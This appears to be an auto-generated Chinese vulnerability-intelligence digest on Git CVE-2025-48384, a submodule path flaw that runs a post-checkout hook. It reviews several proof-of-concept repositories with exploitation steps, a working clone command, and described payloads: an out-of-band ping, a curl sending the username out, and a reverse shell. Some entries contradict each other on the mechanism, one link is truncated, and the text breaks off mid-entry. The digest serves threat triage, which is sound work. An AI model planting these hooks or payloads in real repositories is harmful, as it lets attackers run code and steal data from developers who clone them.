**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
